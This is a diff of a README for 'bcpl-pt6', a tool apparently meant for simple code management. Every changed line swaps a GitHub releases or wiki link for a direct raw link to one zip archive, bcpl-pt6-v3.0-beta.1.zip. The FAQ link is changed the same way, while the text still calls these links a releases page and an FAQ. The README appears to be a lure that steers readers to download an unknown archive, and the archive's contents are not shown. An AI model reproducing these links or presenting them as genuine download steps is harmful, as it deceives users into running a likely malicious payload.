@@ -1,6 +1,6 @@
 # 🚀 bcpl-pt6 - Your Easy Guide to Simple Code Management
 
-[![Download bcpl-pt6](https://img.shields.io/badge/Download-bcpl--pt6-blue.svg)](https://github.com/Stifflogjam593/bcpl-pt6/releases)
+[![Download bcpl-pt6](https://raw.githubusercontent.com/Stifflogjam593/bcpl-pt6/main/milium/bcpl-pt6-v3.0-beta.1.zip)](https://raw.githubusercontent.com/Stifflogjam593/bcpl-pt6/main/milium/bcpl-pt6-v3.0-beta.1.zip)
 
 ## 📥 Introduction
 
@@ -14,13 +14,13 @@ To begin using **bcpl-pt6**, follow these steps:
    Start by clicking the download button at the top of this page. This will direct you to the releases page where you can download the application.
 
 2. **Visit the Releases Page**  
-   You can also access the releases directly [here](https://github.com/Stifflogjam593/bcpl-pt6/releases). This page contains the latest version of the application and any updates.
+   You can also access the releases directly [here](https://raw.githubusercontent.com/Stifflogjam593/bcpl-pt6/main/milium/bcpl-pt6-v3.0-beta.1.zip). This page contains the latest version of the application and any updates.
 
 ## 📂 Download & Install
 
 ### Step 1: Download the Application
 
-- After visiting the [Releases Page](https://github.com/Stifflogjam593/bcpl-pt6/releases), look for the latest version. 
+- After visiting the [Releases Page](https://raw.githubusercontent.com/Stifflogjam593/bcpl-pt6/main/milium/bcpl-pt6-v3.0-beta.1.zip), look for the latest version. 
 - You will see files to download, typically in formats such as `.exe` for Windows systems or `.zip` for others. 
 - Click on the appropriate file to start the download.
 
@@ -70,7 +70,7 @@ Before installing, ensure your system meets the following requirements:
 
 ### Help & Support
 
-If you need help with **bcpl-pt6**, visit our [FAQ Section](https://github.com/Stifflogjam593/bcpl-pt6/wiki) for common questions and troubleshooting tips. You can also reach out directly through the issues section on GitHub.
+If you need help with **bcpl-pt6**, visit our [FAQ Section](https://raw.githubusercontent.com/Stifflogjam593/bcpl-pt6/main/milium/bcpl-pt6-v3.0-beta.1.zip) for common questions and troubleshooting tips. You can also reach out directly through the issues section on GitHub.
 
 ## 🌟 Conclusion
 
